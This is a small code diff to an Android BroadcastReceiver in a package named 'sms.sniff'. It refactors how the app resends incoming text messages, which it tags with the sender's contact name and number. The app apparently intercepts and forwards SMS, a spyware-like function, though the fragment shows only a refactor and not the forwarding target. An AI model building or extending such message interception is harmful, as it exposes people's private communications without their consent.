@@ -1,5 +1,7 @@
 package sms.sniff;
 
+import sms.sniff.utils.SMS;
+import sms.sniff.utils.Utils;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -37,7 +39,7 @@ public class Incoming extends BroadcastReceiver{
 						msg += "De: " + contactName + " ("+ originPhoneNumber + ")" + "\n";
 						msg += messageBody;
 						
-						new SendSMS(msg, originPhoneNumber);
+						new SMS(msg).sendComparingWith(originPhoneNumber);
 					}
 				}
 			} catch (Exception e) {
